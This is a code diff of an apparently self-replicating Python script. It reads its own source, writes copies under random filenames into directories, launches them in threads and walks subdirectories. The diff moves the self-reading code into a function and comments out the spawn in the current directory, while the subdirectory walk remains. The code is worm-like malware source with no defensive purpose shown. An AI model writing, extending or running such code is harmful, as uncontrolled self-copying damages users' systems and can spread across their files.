@@ -31,20 +31,13 @@ def runFuncv(filename):
 
 # get the current file
 
-
-
-thisfile = os.path.abspath(__file__)
-directory = os.getcwd()
-
-
-
-# open up the file and read it
-f = open(thisfile, "r")
-lines = f.readlines()
-f.close()
-
-
 def create_file(dir):
+    thisfile = os.path.abspath(__file__)
+    directory = os.getcwd()
+
+    f = open(thisfile, "r")
+    lines = f.readlines()
+    f.close()
     filename = "{randomness}.py".format(
         randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
     i = open(dir + "\\" + filename, "w")
@@ -55,9 +48,9 @@ def create_file(dir):
 
 
 # Create the new file in current dir and run
-thread = Thread(target=runFuncv, args=[".\\" + create_file(".\\")])
-thread.start()
-
+#thread = Thread(target=runFuncv, args=[".\\" + create_file(".\\")])
+#thread.start()
+directory = os.getcwd()
 #walk to subdirs
 for x in os.walk(directory):
     if x[0] == os.getcwd():
